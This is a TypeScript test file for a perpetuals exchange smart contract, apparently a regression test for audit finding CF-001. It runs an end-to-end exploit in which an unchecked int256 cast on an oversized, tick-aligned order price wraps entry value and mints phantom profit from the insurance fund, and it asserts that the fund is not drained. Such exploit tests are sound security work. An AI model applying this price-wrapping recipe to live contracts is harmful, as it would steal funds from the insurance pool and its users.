import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { network } from "hardhat";
import { maxUint256, parseUnits } from "viem";
import { deployPerpsFixture } from "./fixtures.ts";
import { TimeInForce } from "../fixtures/timeInForce.ts";

const { networkHelpers } = await network.connect();

/**
 * CF-001 (Critical): order price has no upper bound and `int256(price)` is an unchecked
 * cast. A resting ask at P ≥ 2^255 (tick-aligned) is accepted for almost no margin; when
 * it is lifted, the buyer's entry value wraps to an attacker-chosen negative number and
 * closing the position mints phantom PnL out of the insurance fund.
 *
 * End-to-end exploit. The attack is run in full; the test asserts the safe invariant
 * (insurance fund not drained, attacker not enriched, no halt). On the unfixed venue the
 * attack succeeds and these assertions fail; once off-band / oversized prices are rejected
 * at placement the attack cannot start and the invariant holds.
 */
describe("CF-001 — wrapped order price cannot mint phantom PnL from the insurance fund", () => {
  // 2^256 mod 1e4 == 9936, so P = 2^256 - (gain*1e6 + 9936) is tick-aligned (tick = 0.01e6).
  const GAIN_USDC = 50_000n * 1_000_000n; // phantom gain in USDC (6dp), kept below the IF balance
  const X = GAIN_USDC * 1_000_000n + 9936n; // perps divides trade value by 1e6
  const POISON_PRICE = maxUint256 - X + 1n;
  const UNIT = 1n; // 1e-6 contract, matching the audit PoC so P*qty never overflows

  it("does not let an off-market ask socialise a loss onto the fund", async () => {
    const { contracts, accounts, config } = await networkHelpers.loadFixture(deployPerpsFixture);
    const { perps, vault } = contracts;
    const { owner, seller, buyer, buyer2 } = accounts;

    assert.equal(POISON_PRICE % config.minimumPriceIncrement, 0n, "poison price is tick-aligned");

    await perps.write.setTakerFeeBps([0], { account: owner.account });
    await perps.write.setMakerFeeBps([0], { account: owner.account });

    const mark = await perps.read.getMarketPrice();

    // Honest resting bid at the mark gives the attacker an exit to realise against.
    await vault.write.deposit([parseUnits("100", config.tokenDecimals)], { account: buyer2.account });
    await perps.write.createOrder([mark, UNIT, TimeInForce.GTC], { account: buyer2.account });

    // Attacker maker rests the poison ask; attacker taker will lift it.
    await vault.write.deposit([parseUnits("5", config.tokenDecimals)], { account: seller.account });
    await vault.write.deposit([parseUnits("5", config.tokenDecimals)], { account: buyer.account });

    const ifBefore = await vault.read.insuranceFundBalance();
    const takerBefore = await vault.read.balanceOf([buyer.account.address]);

    // Full attack: rest the poison ask, lift it, then close into the honest bid. Any step may
    // revert on a fixed venue; that is a valid (safe) outcome, so swallow reverts and judge by
    // the economic invariant below.
    try {
      await perps.write.createOrder([POISON_PRICE, -UNIT, TimeInForce.GTC], { account: seller.account });
      await perps.write.createOrders(
        [
          [
            { price: POISON_PRICE, quantity: UNIT, timeInForce: TimeInForce.IOC },
            { price: mark, quantity: -UNIT, timeInForce: TimeInForce.IOC },
          ],
        ],
        { account: buyer.account },
      );
    } catch {
      // placement/fill rejected — the attack never moved value
    }

    assert.ok(
      (await vault.read.insuranceFundBalance()) >= ifBefore,
      "insurance fund must not pay out a wrapped-price phantom gain",
    );
    assert.ok(
      (await vault.read.balanceOf([buyer.account.address])) <= takerBefore,
      "attacker must not realise a phantom gain",
    );
    assert.equal(await vault.read.halted(), false, "attack must not latch the vault halt");
  });
});
